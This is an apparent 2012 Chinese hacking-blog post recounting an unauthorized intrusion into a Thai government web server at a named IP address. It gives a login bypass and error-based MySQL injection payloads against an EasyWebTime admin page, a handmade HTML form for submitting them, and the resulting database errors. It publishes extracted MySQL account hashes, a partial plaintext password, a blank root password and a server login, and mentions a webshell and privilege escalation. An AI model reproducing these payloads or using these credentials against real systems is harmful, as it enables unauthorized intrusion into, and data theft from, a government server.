<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>入侵泰国政府网站 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-06-12T09:17:58.000Z" itemprop="datePublished">
          2012-06-12
      </time>
    
    
    | 
    <a href='/tag/入侵/'>入侵</a>,
    
    <a href='/tag/dis9/'>dis9</a>
    
    
</span>
    <h1 class="post-title">入侵泰国政府网站</h1>
    <section class="post-content">
      <p>看了一个泰国政府的网站被伊朗的黑客挂页，上面写着   <br>“Your Box 0wn3z By Behrooz_Ice - Q7x -Sha2ow -Virangar -Ali_Eagle -iman_taktaz - Satanic2000”    <br>“We Love Iran”    <br>“Ashiyane Digital Security Team”    <br>这样的话云云。    <br>下面我就讲讲怎么捅了他们的PP(<a href="http://203.154.183.18/ash_hack.htm" target="_blank" rel="external">http://203.154.183.18/ash_hack.htm</a>)    <br>网站服务器ip为：203.154.183.18上面一共有大约一百多个xx.cad.go.th(泰国<a href="http://gov.com.im/art_design/2012/0419/%E5%85%A5%E4%BE%B5%E6%B3%B0%E5%9B%BD%E6%94%BF%E5%BA%9C%E7%BD%91%E7%AB%99.html" target="_blank" rel="external">政府</a>域名后缀)的网站    <br>包括主域名：<a href="http://www.cad.go.th/" target="_blank" rel="external">www.cad.go.th</a>(<a href="http://www.cad.go.th/webadmin/" target="_blank" rel="external">www.cad.go.th/webadmin/</a>)    <br>我先是看了看上面站的构架，基本上都是一个模板出来的，似乎有点脚本问题，不过不从这边下手。直接访问ip可以看到一个管理后台</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/24a24e5761a3_1231/clip_image001.png" width="474" height="238"></p><a id="more"></a><p></p>  <p>看了看这个后台，上面写着EasyWebTime 8.6，不知道是什么东西。然后我就用   <br>用户名：admin’or 1=1# 密码任意123456登陆，得到如下回显：</p>  <p>INSERT INTO log_user (log_date , log_time , log_mid , log_user , log_date_text , log_ip , log_module , log_module_detail , log_detail ) VALUES (‘2011-11-19’, ‘10:39:41’, ‘’, ‘admin’or 1=1#’, ‘19/11/2011 10:39:41’, ‘24.77.19.26’, ‘login’, ‘login’, ‘เข้าสู่ระบบ’)   <br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ at line 1</p>  <p>关键的地方不是这个INSERT INTO这个错误，关键是</p>  <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ at line 1</p>  <p>这个地方，说明后台有POST注入，而且有数据库错误回显。   <br>这样的话，构建一个SQL注入的POST语句即可，通过错误回显来注入出想要的信息。    <br>错误回显注入很简单，套公式就行了    <br>用户名填写：</p>  <p>admin’ union select 1 from (select count(<em>),concat(floor(rand(0)</em>2),(select user() limit 0,1))a from information_schema.tables group by a)b#</p>  <p>密码任意，点击登陆，提示用户名错误</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/24a24e5761a3_1231/clip_image002.png" width="489" height="289"></p>  <p>估计是Javascript在作怪，绕过这个很简单，考虑到后面注入的简便性，干脆写了一个html文档：</p>  <p>&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;<a href="http://203.154.183.18/login.php&quot;&amp;gt" target="_blank" rel="external">http://203.154.183.18/login.php&quot;&amp;gt</a>;</p>  <p>&lt;textarea rows=&quot;5&quot; style=&quot;font-family:Times New Roman;font-size:14pt;&quot; cols=&quot;80&quot; name=&quot;EWT_User&quot;&gt;admin’ union select 1 from (select count(<em>),concat(floor(rand(0)</em>2),(select user() from mysql.user limit 0,1))a from information_schema.tables group by a)b#&lt;/textarea&gt;</p>  <p>&lt;input name=&quot;EWT_Password&quot; type=&quot;password&quot; class=&quot;texfield&quot; id=&quot;EWT_Password&quot; size=&quot;22&quot; value=&quot;xxxx&quot; /&gt;</p>  <p>&lt;input name=&quot;Submit&quot; type=&quot;submit&quot; class=&quot;submit&quot; value=&quot;Login&quot; /&gt;</p>  <p>&lt;input name=&quot;Flag&quot; type=&quot;hidden&quot; id=&quot;Flag&quot; value=&quot;Login&quot; /&gt;</p>  <p>&lt;input name=&quot;password_hidden&quot; type=&quot;password&quot; style=&quot;display:none&quot;&#160; value=&quot;Welcome&quot; size=&quot;10&quot; /&gt;</p>  <p>&lt;input name=&quot;password_hidden&quot; type=&quot;password&quot; style=&quot;display:none&quot;&#160; value=&quot;Welcome&quot; size=&quot;10&quot; /&gt;</p>  <p>&lt;input name=&quot;password_hidden&quot; type=&quot;password&quot; style=&quot;display:none&quot;&#160; value=&quot;Welcome&quot; size=&quot;10&quot; /&gt;</p>  <p>&lt;/form&gt;</p>  <p>其实很简单，line 1里面的method表示提交方法为POST，后面的action为提交到的地址，这是从登陆页面上面直接扒下来的，但是action这个地址是完整的url地址。再往后面的就比较简单看了，保存为xx.html然后访问，在第一个文本框中输入注入语句即可。   <br>注入语句是这样的：</p>  <p>admin’ union select 1 from (select count(<em>),concat(floor(rand(0)</em>2),(select user() from mysql.user limit 0,1))a from information_schema.tables group by a)b#</p>  <p>于是得到了回显如下：</p>  <p>SELECT <em> FROM user_info WHERE EWT_User = ‘admin’ union select 1 from (select count(</em>),concat(floor(rand(0)<em>2),(select user() from mysql.user limit 0,1))a from information_schema.tables group by a)b#’ AND EWT_Pass = ‘ea416ed0759d46a8de58f63a59077499’ AND EWT_Status = ‘Y’&#160; <br>Duplicate entry ‘1bizpoten@203.154.183.18’ for key 1</em></p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/24a24e5761a3_1231/clip_image003.png" width="614" height="252"></p>  <p>后面的Duplicate entry ‘1bizpoten@203.154.183.18’ for key 1就是想要的注入结果（去掉前面的固定数字’1’）   <br>注入语句中的</p>  <p>select user() from mysql.user limit 0,1</p>  <p>换成想要的注入语句即可，例如：</p>  <p>select user from mysql.user where host=’%’ limit 0,1</p>  <p>复制代码</p>  <p>因为每次注入得到的信息只有一条，所以比较吃力   <br>但是最后我注入总结的信息如下：    <br>mysql账户：    <br>用户名： 密码哈希    <br>kk&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 8B9BA157688A49AFBE7513677DCD4F7C43257018&#160; %    <br>bizpoten&#160;&#160; <em>7F6E575FAD18674CADD3B8495C79FBA5B58090D1//!2QwAsZx&#160;&#160;&#160; %    <br>webboard&#160; </em>51E610BE77CF0F81D2861AF180B496D1CA2A7637&#160;&#160; localhost    <br>root&#160;&#160;&#160;&#160; 密码空&#160; 127.0.0.1    <br>数据库中得数据表段：</p>  <p>admin’ union select 1 from (select count(<em>),concat(floor(rand(0)</em>2),(select table_name from information_schema.tables where table_schema=database() limit 0,1))a from information_schema.tables group by a)b#</p>  <p>大概有70多个，中间跳着过去的，没把表全列出来，具体我忘了，最后面的user_info引起了我的注意：   <br>amphur,article_list,block,block_text,blog_category,blog_comment,org_type,user_info    <br>最后得到服务器的203.154.183.18的登录名和密码为：template/template    <br>取到webshell也就不难了    <br>当然，服务器是windows，装了卡巴斯基，国内的360根本就不是和<a href="http://gov.com.im/art_design/2012/0419/%E5%85%A5%E4%BE%B5%E6%B3%B0%E5%9B%BD%E6%94%BF%E5%BA%9C%E7%BD%91%E7%AB%99.html" target="_blank" rel="external">卡巴斯基</a>一个档次的，提权颇费周折</p>  <p><strong><font color="#000080">原文：</font></strong><a href="http://gov.com.im/art_design/2012/0419/%E5%85%A5%E4%BE%B5%E6%B3%B0%E5%9B%BD%E6%94%BF%E5%BA%9C%E7%BD%91%E7%AB%99.html" target="_blank" rel="external"><strong><font color="#000080">http://gov.com.im/art_design/2012/0419/%E5%85%A5%E4%BE%B5%E6%B3%B0%E5%9B%BD%E6%94%BF%E5%BA%9C%E7%BD%91%E7%AB%99.html</font></strong></a></p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://www.cker.in/470.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://www.cker.in/470.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cker.in/470.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.cker.in/470.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/473.seo/">
        ← 渗透某大型内网入侵过程
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/467.seo/">
        渗透菲律宾星报官网 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
